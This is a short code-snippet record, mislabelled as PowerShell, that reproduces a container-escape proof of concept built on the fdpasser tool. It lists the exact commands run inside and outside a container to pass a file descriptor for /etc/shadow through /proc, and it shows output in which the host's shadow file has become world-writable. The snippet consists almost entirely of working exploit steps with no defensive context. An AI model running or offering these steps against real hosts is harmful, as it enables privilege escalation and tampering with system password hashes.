---
id: b1fdb3ca-3a34-4a10-8aaa-fa7564975812
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:17.212947+00:00'
updated_at: '2023-04-10T20:33:49.354335+00:00'
---

# Code Snippet b1fdb3ca

**Language**: Powershell

```powershell
https://github.com/FSecureLABS/fdpasser
In container, as root: ./fdpasser recv /moo /etc/shadow
Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
Outside container: ls -la /etc/shadow
Output: -rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow
```
